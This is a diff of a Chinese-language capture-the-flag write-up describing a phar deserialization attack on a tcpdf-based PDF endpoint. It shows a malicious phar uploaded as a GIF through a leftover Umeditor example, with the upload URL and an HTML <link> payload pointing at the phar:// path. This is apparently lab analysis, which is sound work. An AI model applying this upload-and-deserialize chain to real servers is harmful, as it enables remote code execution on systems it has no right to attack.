@@ -134,8 +134,6 @@ public release
 
 > 可惜
 
-这还算是正常的。
-
 根据 Hint 1: tcpdf，他有一个 `/pdf` 接口，直接通过 HTML 生成 PDF。
 
 这个 tcpdf 有个反序列化漏洞，可以任意执行 phar。
@@ -205,4 +203,27 @@ $phar->stopBuffering();
 
 换言之，如果我们调用一次这个类型的 `__toString` 魔法方法，就会在当前目录下创建一个 `step4` 文件，并向其中写入 `data`。
 
-那么该怎么调用呢？这又是个
+那么该怎么调用呢？Static 中有个 Umeditor Example。
+
+> 这种东西居然能打包进生产环境？
+
+把 phar 放进来：
+
+```
+http://111.186.57.85:30042/Public/statics/umeditor1_2_3/php/upload/20201012/16024844906165.gif
+```
+
+得到 URL：
+
+`phar://../../Public/statics/umeditor1_2_3/php/upload/20201012/16024844906165.gif`
+
+构造 HTML：
+
+```html
+<link type="text/css" href="phar://../../Public/statics/umeditor1_2_3/php/upload/20201012/16024844906165.gif">
+```
+
+就可以通报执行了。
+
+唯一的问题就是：怎么找到那个 `__destruct` 中 `echo` 的 Vulnerable 函数。
+
